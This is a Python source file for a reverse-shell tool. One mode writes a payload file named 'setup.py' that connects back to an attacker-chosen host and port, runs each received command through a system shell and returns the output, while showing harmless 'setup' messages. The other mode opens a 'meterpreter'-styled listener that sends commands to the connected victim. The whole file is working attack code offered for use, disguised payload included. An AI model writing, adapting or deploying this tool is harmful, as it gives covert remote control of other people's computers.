import argparse as arg 
import time
import socket
import sys
import os

os.system('cls' if os.name == 'nt' else 'clear')

def main():
    typer_arg = arg.ArgumentParser(description="Copyright : Pham Chien")
    typer_arg.add_argument('-lh', '--lhost', type=str, help='SET LOCAL IP Address (Usage : -lh 192.168.1.12)')
    typer_arg.add_argument('-lp', '--lport', type=int, help='SET LOCAL PORT IP Address [Usage : -lp 4444]')
    typer_arg.add_argument('-rh', '--rhost', type=str, help='SET REMOTE IP Address [Usage : -rh 192.168.1.12]')
    typer_arg.add_argument('-rp', '--rport', type=int, help='SET REMOTE PORT IP Address [Usage : -rp 4444]')
    
    args = typer_arg.parse_args()

    LHOST = args.lhost
    LPORT = args.lport
    RHOST = args.rhost 
    RPORT = args.rport

    if RHOST:
        if RPORT:
            print("[info] RHOST => {}".format(RHOST))
            print("[info] RPORT => {}".format(RPORT))
            time.sleep(1)
            print("[info] Stating Created Files...")
            FILES = 'setup'
            code = f'''
import socket
import subprocess
import os
HOST = '{RHOST}'
PORT = {RPORT}
s = socket.socket(
    socket.AF_INET,
    socket.SOCK_STREAM
)
s.connect((HOST, PORT))
os.system('cls' if os.name == 'nt' else 'clear')
print("[info] Started Setup...")
while True:
    output_shell = s.recv(9080)
    if output_shell == b'exit':
        print("[+] Setup Failed...")
        s.close()
        exit()
    else:
        phamchien_hacker = subprocess.Popen(
            output_shell,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        data = phamchien_hacker.stdout.read() + phamchien_hacker.stderr.read()
        s.send(data)
    '''
            with open('{}.py'.format(FILES), 'w') as local_file:
                local_file.write(code)
            print("[info] Created Files DONE..")
            time.sleep(1)
            print("[info] INFO : {}".format(local_file))
            exit()

    if LHOST:
        LOCAL_HOST = str(f'{LHOST}')
        if LPORT:
            LOCAL_PORT = int(LPORT)

            s = socket.socket(
                socket.AF_INET,
                socket.SOCK_STREAM
            )
            s.setsockopt(
                socket.SOL_SOCKET,
                socket.SO_REUSEADDR,
                1
            )
            s.bind((LOCAL_HOST, LOCAL_PORT))
            s.listen(1)
            print("[info] Your Session SHELL {}:{} as Stated...".format(LOCAL_HOST, LOCAL_PORT))
            connect_info, address_info = s.accept()
            print("[info] {} has connection to {}:{}".format(address_info, LOCAL_HOST, LOCAL_PORT))
            time.sleep(1)
            print("[warning] INFO : {}".format(connect_info))
            time.sleep(1)
            print("[info] Session 1 Started...")
            session = True

            while True:
                sys.stdout.write('\nshell@meterpreter > ')
                shell_cmd = sys.stdin.readline()

                if shell_cmd == 'exit\n':
                    print("[warning] Session EXITED..")
                    connect_info.send(b'exit\n')
                    connect_info.close()
                    exit()

                elif shell_cmd != '\n':
                    connect_info.send(shell_cmd.encode('utf-8'))
                    output = connect_info.recv(10080)
                    print("\n")
                    print(output)

    else:
        print("Copyright : Pham Chien")
        print("CREATED FILE : python main.py -rh < ex : 192.168.1.12 > -rp < ex : 4444 >")
        print("EXPLOIT : python main.py -lh < ex : 192.168.1.12 > -lp < ex : 4444 >")
        print("python main.py -h for help")
        exit()

if __name__ == '__main__':
    main()
